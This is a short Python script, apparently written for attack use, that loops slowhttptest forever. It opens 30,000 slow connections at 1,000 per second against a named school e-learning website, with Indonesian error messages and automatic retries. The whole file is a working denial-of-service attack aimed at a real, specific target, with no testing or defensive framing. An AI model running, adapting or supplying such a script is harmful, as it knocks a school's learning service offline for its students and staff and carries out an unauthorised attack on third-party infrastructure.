import subprocess
while True:
        try:
                attcommand = subprocess.run(['slowhttptest', '-c', '30000', '-H', '-u', 'https://elearning.smk2-yk.sch.id', '-r', '1000', '-l', '3500'],check=True, capture_output=True, text=True)
                print("Output :")
                print(attcommand.stdout)
        except subprocess.CalledProcessError as e:
                print(f"Perintah gagal dijalankan dengan kode error: {e.returncode}")
                print(f"Pesan error: {e.stderr}")
                print("Trying again")
                tryingagain = subprocess.run(['slowhttptest', '-c', '30000', '-H', '-u', 'https://elearning.smk2-yk.sch.id', '-r', '1000', '-l', '3500'],check=True,capture_output=True, text=True)
                print("Output after trying again: ")
                print(tryingagain.stdout)
